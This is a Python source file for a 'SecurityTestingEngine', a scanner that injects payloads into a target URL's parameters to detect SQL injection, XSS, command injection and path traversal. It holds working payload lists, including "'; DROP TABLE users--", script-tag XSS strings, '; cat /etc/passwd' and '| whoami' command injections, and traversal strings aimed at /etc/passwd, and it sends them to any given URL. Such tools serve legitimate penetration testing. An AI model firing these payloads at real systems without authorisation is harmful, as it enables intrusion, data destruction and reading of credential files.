"""
Security Testing Engine
Professional-grade HTTP request testing and vulnerability detection
"""

import requests
import re
import time
import json
import urllib.parse
from typing import Dict, List, Any, Optional
from datetime import datetime

class SecurityTestingEngine:
    """
    Production-ready security testing engine
    - HTTP request/response testing
    - Vulnerability detection (SQL injection, XSS, etc.)
    - Payload generation and testing
    - Response analysis
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.test_history = []
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        
    def execute_request(self, request_config: Dict) -> Dict[str, Any]:
        """
        Execute HTTP request with full control
        
        Args:
            request_config: {
                'method': 'GET/POST/PUT/DELETE/PATCH/OPTIONS/HEAD',
                'url': 'https://target.com/endpoint',
                'headers': {'Header-Name': 'value'},
                'params': {'param': 'value'},
                'body': 'request body' or {'json': 'data'},
                'auth': {'type': 'bearer/basic', 'credentials': '...'},
                'follow_redirects': True/False,
                'verify_ssl': True/False,
                'timeout': 30
            }
        
        Returns:
            Complete request/response data with timing and analysis
        """
        try:
            # Prepare request
            method = request_config.get('method', 'GET').upper()
            url = request_config.get('url')
            headers = request_config.get('headers', {})
            params = request_config.get('params', {})
            body = request_config.get('body')
            auth_config = request_config.get('auth', {})
            follow_redirects = request_config.get('follow_redirects', True)
            verify_ssl = request_config.get('verify_ssl', True)
            timeout = request_config.get('timeout', 30)
            
            # Add authentication
            if auth_config:
                auth_type = auth_config.get('type', '').lower()
                credentials = auth_config.get('credentials', '')
                
                if auth_type == 'bearer':
                    headers['Authorization'] = f'Bearer {credentials}'
                elif auth_type == 'api_key':
                    headers['X-API-Key'] = credentials
                elif auth_type == 'basic':
                    # credentials should be 'username:password'
                    import base64
                    encoded = base64.b64encode(credentials.encode()).decode()
                    headers['Authorization'] = f'Basic {encoded}'
            
            # Timing
            start_time = time.time()
            
            # Execute request
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                params=params,
                data=body if isinstance(body, (str, bytes)) else None,
                json=body if isinstance(body, dict) and method in ['POST', 'PUT', 'PATCH'] else None,
                allow_redirects=follow_redirects,
                verify=verify_ssl,
                timeout=timeout
            )
            
            end_time = time.time()
            response_time = (end_time - start_time) * 1000  # Convert to ms
            
            # Build result
            result = {
                'success': True,
                'request': {
                    'method': method,
                    'url': url,
                    'headers': dict(headers),
                    'params': params,
                    'body': body
                },
                'response': {
                    'status_code': response.status_code,
                    'status_text': response.reason,
                    'headers': dict(response.headers),
                    'body': response.text,
                    'size': len(response.content),
                    'time_ms': round(response_time, 2)
                },
                'timing': {
                    'total_ms': round(response_time, 2),
                    'dns_lookup': 0,  # Would need more detailed timing
                    'tcp_connect': 0,
                    'ssl_handshake': 0,
                    'ttfb': 0,
                    'transfer': 0
                },
                'metadata': {
                    'timestamp': datetime.now().isoformat(),
                    'final_url': response.url,
                    'redirect_count': len(response.history),
                    'cookies': dict(response.cookies)
                }
            }
            
            # Store in history
            self.test_history.append(result)
            
            return result
            
        except requests.exceptions.RequestException as e:
            return {
                'success': False,
                'error': str(e),
                'error_type': type(e).__name__,
                'request': request_config
            }
    
    def test_sql_injection(self, url: str, params: Dict, method: str = 'GET') -> Dict[str, Any]:
        """
        Test for SQL injection vulnerabilities
        """
        results = {
            'vulnerable': False,
            'confidence': 0,
            'tests_performed': [],
            'findings': []
        }
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND 1=2 UNION SELECT NULL, NULL--",
            "admin'--",
            "1' OR '1'='1' /*"
        ]
        
        # Test each parameter
        for param_name, param_value in params.items():
            for payload in sql_payloads:
                # Create test payload
                test_params = params.copy()
                test_params[param_name] = payload
                
                # Execute request
                response = self.execute_request({
                    'method': method,
                    'url': url,
                    'params': test_params if method == 'GET' else {},
                    'body': test_params if method == 'POST' else None,
                    'verify_ssl': False
                })
                
                if not response.get('success'):
                    continue
                
                test_result = {
                    'parameter': param_name,
                    'payload': payload,
                    'response_code': response['response']['status_code'],
                    'vulnerable': False
                }
                
                # Check for SQL error indicators
                response_body = response['response']['body'].lower()
                sql_errors = [
                    'sql syntax', 'mysql', 'postgresql', 'oracle', 'microsoft',
                    'syntax error', 'unclosed quotation', 'quoted string',
                    'database error', 'warning: mysql'
                ]
                
                for error in sql_errors:
                    if error in response_body:
                        test_result['vulnerable'] = True
                        test_result['evidence'] = f'SQL error detected: {error}'
                        results['vulnerable'] = True
                        results['confidence'] = max(results['confidence'], 85)
                        results['findings'].append(test_result)
                        break
                
                results['tests_performed'].append(test_result)
                
                # Rate limiting
                time.sleep(0.5)
        
        return results
    
    def test_xss(self, url: str, params: Dict, method: str = 'GET') -> Dict[str, Any]:
        """
        Test for Cross-Site Scripting vulnerabilities
        """
        results = {
            'vulnerable': False,
            'confidence': 0,
            'tests_performed': [],
            'findings': []
        }
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        for param_name, param_value in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self.execute_request({
                    'method': method,
                    'url': url,
                    'params': test_params if method == 'GET' else {},
                    'body': test_params if method == 'POST' else None,
                    'verify_ssl': False
                })
                
                if not response.get('success'):
                    continue
                
                test_result = {
                    'parameter': param_name,
                    'payload': payload,
                    'response_code': response['response']['status_code'],
                    'vulnerable': False
                }
                
                # Check if payload is reflected unencoded
                response_body = response['response']['body']
                
                # Simple check: is the payload present unmodified?
                if payload in response_body:
                    test_result['vulnerable'] = True
                    test_result['evidence'] = 'Payload reflected unencoded in response'
                    results['vulnerable'] = True
                    results['confidence'] = 90
                    results['findings'].append(test_result)
                
                results['tests_performed'].append(test_result)
                time.sleep(0.5)
        
        return results
    
    def test_command_injection(self, url: str, params: Dict, method: str = 'GET') -> Dict[str, Any]:
        """
        Test for command injection vulnerabilities
        """
        results = {
            'vulnerable': False,
            'confidence': 0,
            'tests_performed': [],
            'findings': []
        }
        
        # Command injection payloads
        cmd_payloads = [
            "; ls",
            "| ls",
            "` ls `",
            "$( ls )",
            "; cat /etc/passwd",
            "| ping -c 3 127.0.0.1"
        ]
        
        for param_name, param_value in params.items():
            for payload in cmd_payloads:
                test_params = params.copy()
                test_params[param_name] = str(param_value) + payload
                
                response = self.execute_request({
                    'method': method,
                    'url': url,
                    'params': test_params if method == 'GET' else {},
                    'body': test_params if method == 'POST' else None,
                    'verify_ssl': False
                })
                
                if not response.get('success'):
                    continue
                
                test_result = {
                    'parameter': param_name,
                    'payload': payload,
                    'response_code': response['response']['status_code'],
                    'vulnerable': False
                }
                
                # Check for command output indicators
                response_body = response['response']['body'].lower()
                cmd_indicators = [
                    'root:', 'bin:', 'usr/bin', 'total ', 
                    'directory of', '64 bytes from'
                ]
                
                for indicator in cmd_indicators:
                    if indicator in response_body:
                        test_result['vulnerable'] = True
                        test_result['evidence'] = f'Command execution indicator: {indicator}'
                        results['vulnerable'] = True
                        results['confidence'] = 95
                        results['findings'].append(test_result)
                        break
                
                results['tests_performed'].append(test_result)
                time.sleep(0.5)
        
        return results
    
    def test_path_traversal(self, url: str, params: Dict, method: str = 'GET') -> Dict[str, Any]:
        """
        Test for path traversal vulnerabilities
        """
        results = {
            'vulnerable': False,
            'confidence': 0,
            'tests_performed': [],
            'findings': []
        }
        
        # Path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\windows\\win.ini"
        ]
        
        for param_name, param_value in params.items():
            for payload in path_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self.execute_request({
                    'method': method,
                    'url': url,
                    'params': test_params if method == 'GET' else {},
                    'body': test_params if method == 'POST' else None,
                    'verify_ssl': False
                })
                
                if not response.get('success'):
                    continue
                
                test_result = {
                    'parameter': param_name,
                    'payload': payload,
                    'response_code': response['response']['status_code'],
                    'vulnerable': False
                }
                
                # Check for file content indicators
                response_body = response['response']['body'].lower()
                file_indicators = [
                    'root:x:0:0', 'bin:x:', '[extensions]', 
                    'for 16-bit app support', '[fonts]'
                ]
                
                for indicator in file_indicators:
                    if indicator in response_body:
                        test_result['vulnerable'] = True
                        test_result['evidence'] = f'File content detected: {indicator}'
                        results['vulnerable'] = True
                        results['confidence'] = 100
                        results['findings'].append(test_result)
                        break
                
                results['tests_performed'].append(test_result)
                time.sleep(0.5)
        
        return results
    
    def comprehensive_vulnerability_scan(self, url: str, params: Dict, method: str = 'GET') -> Dict[str, Any]:
        """
        Run comprehensive vulnerability tests
        """
        return {
            'sql_injection': self.test_sql_injection(url, params, method),
            'xss': self.test_xss(url, params, method),
            'command_injection': self.test_command_injection(url, params, method),
            'path_traversal': self.test_path_traversal(url, params, method),
            'timestamp': datetime.now().isoformat()
        }
    
    def _load_vulnerability_patterns(self) -> Dict:
        """Load vulnerability detection patterns"""
        return {
            'sql_errors': [
                r'sql syntax', r'mysql', r'postgresql', r'oracle',
                r'syntax error', r'database error'
            ],
            'xss_indicators': [
                r'<script>', r'onerror=', r'onload=', r'javascript:'
            ],
            'command_indicators': [
                r'root:', r'bin:', r'usr/bin', r'directory of'
            ],
            'path_indicators': [
                r'root:x:0:0', r'\[extensions\]', r'\[fonts\]'
            ]
        }
    
    def generate_payloads(self, vuln_type: str) -> List[str]:
        """Generate payloads for specific vulnerability type"""
        payload_library = {
            'sql_injection': [
                "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
                "'; DROP TABLE users--", "admin'--",
                "' AND 1=2 UNION SELECT NULL, version()--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "'\"><script>alert(1)</script>"
            ],
            'command_injection': [
                "; ls", "| ls", "` ls `", "$( ls )",
                "; cat /etc/passwd", "| whoami"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..\\..\\..\\windows\\win.ini"
            ]
        }
        
        return payload_library.get(vuln_type, [])
